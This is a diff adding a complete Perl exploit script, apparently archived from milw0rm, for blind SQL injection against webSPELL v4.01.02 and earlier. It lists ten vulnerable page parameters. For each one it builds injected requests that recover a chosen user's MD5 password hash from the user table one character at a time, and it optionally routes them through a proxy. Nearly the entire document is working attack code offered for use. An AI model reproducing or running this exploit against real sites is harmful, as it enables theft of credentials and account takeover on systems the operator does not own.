@@ -1,0 +1,181 @@
+#!/usr/bin/perl
+use LWP::UserAgent;
+use Getopt::Long;
+
+if(!$ARGV[3])
+{
+  print "\n                           \\#'#/                        ";
+  print "\n                           (-.-)                         ";
+  print "\n   -------------------oOO---(_)---OOo--------------------";
+  print "\n   | webSPELL <= v4.01.02 Multiple Remote SQL Injection |";
+  print "\n   |                   coded by DNX                     |";
+  print "\n   ------------------------------------------------------";
+  print "\n[!] Solution: install security fix";
+  print "\n[!] Usage: perl ws.pl [Host] [Path] [Target] <Options>";
+  print "\n[!] Example: perl ws.pl 127.0.0.1 /webspell/ -0 -id 1";
+  print "\n[!] Targets:";
+  print "\n       -0            Bug in awards.php line 207, inject code in \$awardID";
+  print "\n       -1            Bug in clanwars_details.php line 36, inject code in \$cwID";
+  print "\n       -2            Bug in demos.php line 301, inject code in \$demoID";
+  print "\n       -3            Bug in profile.php line 37, inject code in \$id";
+  print "\n       -4            Bug in links.php line 139, inject code in \$linkcatID";
+  print "\n       -5            Bug in faq.php line 37, inject code in \$faqcatID";
+  print "\n       -6            Bug in faq.php line 72, inject code in \$faqID";
+  print "\n       -7            Bug in articles.php line 256, inject code in \$articlesID";
+  print "\n       -8            Bug in news_comments.php line 38, inject code in \$newsID";
+  print "\n       -9            Bug in cash_box.php line 119, inject code in \$id";
+  print "\n[!] Options:";
+  print "\n       -id [no]      Valid ID for \$awardID, \$cwID, \$demoID, \$newsID, ...";
+  print "\n       -uid [no]     User-ID, default is 1";
+  print "\n       -t [name]     Changed the user table name, default is webs_user";
+  print "\n       -p [ip:port]  Proxy support";
+  print "\n";
+  exit;
+}
+
+my $host    = $ARGV[0];
+my $path    = $ARGV[1];
+my $user    = 1;
+my $table   = "webs_user";
+my $id      = 0;
+my %options = ();
+GetOptions(\%options, "0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "id=i", "uid=i", "t=s", "p=s");
+
+print "[!] Exploiting...\n";
+
+if($options{"id"})
+{
+  $id = $options{"id"};
+}
+else
+{
+  print "[!] Exploit failed, missing parameter\n";
+  exit;
+}
+
+if($options{"uid"})
+{
+  $user = $options{"uid"};
+}
+
+if($options{"t"})
+{
+  $table = $options{"t"};
+}
+
+syswrite(STDOUT, "[!] MD5-Hash: ", 14);
+
+for(my $i = 1; $i <= 32; $i++)
+{
+  my $found = 0;
+  my $h = 48;
+  while(!$found && $h <= 57)
+  {
+    if(istrue3($host, $path, $table, $id, $user, $i, $h))
+    {
+      $found = 1;
+      syswrite(STDOUT, chr($h), 1);
+    }
+    $h++;
+  }
+  if(!$found)
+  {
+    $h = 97;
+    while(!$found && $h <= 122)
+    {
+      if(istrue3($host, $path, $table, $id, $user, $i, $h))
+      {
+        $found = 1;
+        syswrite(STDOUT, chr($h), 1);
+      }
+      $h++;
+    }
+  }
+}
+
+print "\n[!] Exploit done\n";
+
+sub istrue3
+{
+  my $host   = shift;
+  my $path   = shift;
+  my $table  = shift;
+  my $id     = shift;
+  my $uid    = shift;
+  my $i      = shift;
+  my $h      = shift;
+  my $url    = "http://".$host.$path;
+  my $regexp = "";
+  
+  my $ua = LWP::UserAgent->new;
+  
+  if($options{"0"})
+  {
+    $url .= "index.php?site=awards&action=details&awardID=".$id."'%20AND%20SUBSTRING((SELECT%20password%20FROM%20".$table."%20WHERE%20userID=".$uid."),".$i.",1)=CHAR(".$h.")/*";  
+    $regexp = "Event: -";
+  }
+  if($options{"1"})
+  {
+    $url .= "index.php?site=clanwars_details&cwID=".$id."'%20AND%20SUBSTRING((SELECT%20password%20FROM%20".$table."%20WHERE%20userID=".$uid."),".$i.",1)=CHAR(".$h.")/*";
+    $regexp = "<img src=\"images\/games\/\.gif";
+  }
+  if($options{"2"})
+  {
+    $url .= "index.php?site=demos&action=showdemo&demoID=".$id."'%20AND%20SUBSTRING((SELECT%20password%20FROM%20".$table."%20WHERE%20userID=".$uid."),".$i.",1)=CHAR(".$h.")/*";
+    $regexp = "<img src=\"images\/games\/\.gif";
+  }
+  if($options{"3"})
+  {
+    $url .= "index.php?site=profile&action=buddys&id=".$id."'%20AND%20SUBSTRING((SELECT%20password%20FROM%20".$table."%20WHERE%20userID=".$uid."),".$i.",1)=CHAR(".$h.")/*";
+    $regexp = "no buddys";
+  }
+  if($options{"4"})
+  {
+    $url .= "index.php?site=links&action=show&linkcatID=".$id."'%20AND%20SUBSTRING((SELECT%20password%20FROM%20".$table."%20WHERE%20userID=".$uid."),".$i.",1)=CHAR(".$h.")/*";
+    $regexp = "no links available";
+  }
+  if($options{"5"})
+  {
+    $url .= "index.php?site=faq&action=faqcat&faqcatID=".$id."'%20AND%20SUBSTRING((SELECT%20password%20FROM%20".$table."%20WHERE%20userID=".$uid."),".$i.",1)=CHAR(".$h.")/*";
+    $regexp = "no faq available";
+  }
+  if($options{"6"})
+  {
+    $url .= "index.php?site=faq&action=faq&faqID=".$id."'%20AND%20SUBSTRING((SELECT%20password%20FROM%20".$table."%20WHERE%20userID=".$uid."),".$i.",1)=CHAR(".$h.")/*";
+    $regexp = "no faq available";
+  }
+  if($options{"7"})
+  {
+    $url .= "index.php?site=articles&action=show&articlesID=".$id."'%20AND%20SUBSTRING((SELECT%20password%20FROM%20".$table."%20WHERE%20userID=".$uid."),".$i.",1)=CHAR(".$h.")/*";
+    $regexp = "no entries";
+  }
+  if($options{"8"})
+  {
+    $url .= "index.php?site=news_comments&newsID=".$id."'%20AND%20SUBSTRING((SELECT%20password%20FROM%20".$table."%20WHERE%20userID=".$uid."),".$i.",1)=CHAR(".$h.")/*";
+    $regexp = "no version in selected language available";
+  }
+  if($options{"9"})
+  {
+    $url .= "index.php?site=cash_box&action=edit&id=".$id."'%20AND%20SUBSTRING((SELECT%20password%20FROM%20".$table."%20WHERE%20userID=".$uid."),".$i.",1)=CHAR(".$h.")/*";
+    $regexp = "<textarea name=\"info\" cols=\"50\" rows=\"7\"><\/textarea>";
+  }
+  
+  if($options{"p"})
+  {
+    $ua->proxy('http', "http://".$options{"p"});
+  }
+  
+  my $response = $ua->get($url);
+  my $content = $response->content;
+  
+  if($content !~ /$regexp/)
+  {
+    return 1;
+  }
+  else
+  {
+    return 0;
+  }
+}
+
+# milw0rm.com [2007-03-02]
